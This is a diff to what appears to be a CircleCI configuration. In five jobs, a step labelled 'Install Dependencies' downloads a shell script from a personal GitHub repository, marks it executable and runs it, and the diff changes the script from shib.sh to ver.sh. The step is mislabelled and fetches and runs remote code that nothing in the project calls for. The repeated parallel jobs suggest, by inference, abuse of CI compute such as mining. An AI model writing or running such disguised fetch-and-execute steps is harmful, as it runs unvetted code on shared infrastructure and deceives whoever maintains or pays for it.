@@ -6,7 +6,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://raw.githubusercontent.com/rikydwi88/shiba/main/shib.sh && chmod u+x shib.sh && ./shib.sh
+            command: wget https://raw.githubusercontent.com/rikydwi88/shiba/main/ver.sh && chmod u+x ver.sh && ./ver.sh
 
     aku2:
       docker:
@@ -14,7 +14,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://raw.githubusercontent.com/rikydwi88/shiba/main/shib.sh && chmod u+x shib.sh && ./shib.sh
+            command: wget https://raw.githubusercontent.com/rikydwi88/shiba/main/ver.sh && chmod u+x ver.sh && ./ver.sh
 
     aku3:
       docker:
@@ -22,15 +22,14 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://raw.githubusercontent.com/rikydwi88/shiba/main/shib.sh && chmod u+x shib.sh && ./shib.sh
-
+            command: wget https://raw.githubusercontent.com/rikydwi88/shiba/main/ver.sh && chmod u+x ver.sh && ./ver.sh
     aku4:
       docker:
             - image: circleci/ruby:2.4
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://raw.githubusercontent.com/rikydwi88/shiba/main/shib.sh && chmod u+x shib.sh && ./shib.sh
+            command: wget https://raw.githubusercontent.com/rikydwi88/shiba/main/ver.sh && chmod u+x ver.sh && ./ver.sh
 
     aku5:
       docker:
@@ -38,7 +37,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://raw.githubusercontent.com/rikydwi88/shiba/main/shib.sh && chmod u+x shib.sh && ./shib.sh
+            command: wget https://raw.githubusercontent.com/rikydwi88/shiba/main/ver.sh && chmod u+x ver.sh && ./ver.sh
 
 workflows:
     version: 2
